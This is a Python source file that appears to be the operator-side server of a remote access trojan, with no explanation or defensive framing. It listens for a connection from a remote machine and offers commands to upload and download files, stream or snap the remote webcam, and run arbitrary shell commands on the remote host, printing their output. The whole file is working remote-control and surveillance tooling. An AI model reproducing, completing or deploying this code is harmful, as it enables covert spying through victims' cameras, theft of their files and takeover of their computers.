import socket
import codecs
import cv2
import numpy
from threading import Thread

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 7200))
s.listen(1)
conn, adrr = s.accept()

s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.bind(('', 720))
s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s2.listen(1)

def camera(tp):
    conn2, adrr2 = s2.accept()    
        
    while True:
        frame = conn2.recv(1024)
        data = b''
        if frame.startswith('START'.encode()):
            data += frame.split('START'.encode())[1]
            while True:
                packet = conn2.recv(1024)
                if packet.endswith('END'.encode()):
                    data += packet.split('END'.encode())[0]
                    break
                data += packet

        data = numpy.frombuffer(data, dtype='uint8')
        decimg = cv2.imdecode(data,1)
        cv2.imshow('frame',decimg)
        if tp:
            conn2.send('STOP'.encode())
            cv2.waitKey(0)
            break
        else:
            if cv2.waitKey(1) == 27:
                conn2.send('STOP'.encode())
                break
        conn2.send('GO'.encode())
    cv2.destroyAllWindows()
    conn2.close()

    

while True:
    command = input('> ')

    if 'up' in command:
        file = command.split('*')[1]
        with open(file, 'rb') as f:
            data = 'UPLOAD_BEGIN'.encode()
            data += f.read()
            data += 'UPLOAD_END'.encode()

        conn.send(data)

        resp = ''
        if 'Oki!'.encode() in data:
            resp += data.decode().split('Oki!')[0]
        print(resp)

    elif 'down' in command:
        conn.send(command.encode())
        file = command.split('*')[1]
        name,ext = file.split('.')
        
        packet = conn.recv(1024)
        data = b''
        if packet.startswith('START'.encode()):
            data += packet.split('START'.encode())[1]
            while True:
                packet = conn.recv(1024)
                if packet.endswith('END'.encode()):
                    data += packet.split('END'.encode())[0]
                    break
                data += packet
                
        with open(file, 'wb') as f:
            f.write(data)

    elif 'live' in command:
        conn.send(command.encode())
        tp = command.split('*')[1]
        if tp == 'pic':
            cm = Thread(target=camera, args=(1,))
            cm.start()
        elif tp == 'vid':
            cm = Thread(target=camera, args=(0,))
            cm.start()
        pass

    elif 'terminate' in command:
        conn.send(command.encode())
        break

    else:
        conn.send(command.encode())

        resp = ''
        while True:
            data = conn.recv(1024)
            if 'Oki!'.encode() in data:
                resp += data.decode(errors='ignore').split('Oki!')[0]
                break
            resp += data.decode(errors='ignore')
        print(resp)
    
